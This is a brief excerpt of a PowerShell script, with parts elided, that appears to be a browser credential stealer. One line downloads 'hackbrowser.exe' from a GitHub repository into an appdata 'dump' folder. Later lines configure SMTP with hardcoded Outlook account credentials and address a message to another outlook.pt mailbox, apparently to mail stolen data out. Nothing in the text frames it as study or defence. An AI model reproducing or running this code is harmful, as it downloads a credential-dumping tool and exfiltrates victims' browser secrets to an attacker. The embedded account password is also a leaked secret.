...
Invoke-WebRequest -Uri "https://github.com/sfdghfhdh/dfhdfhdfh/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
...
$smtp.Credentials = New-Object System.Net.NetworkCredential("outlokservice@outlook.pt", "Edivextreme2007");
$smtp.EnableSsl = $true
$Message.From = "outlokservice@outlook.pt"
$Message.To.Add("somosoutlok@outlook.pt")
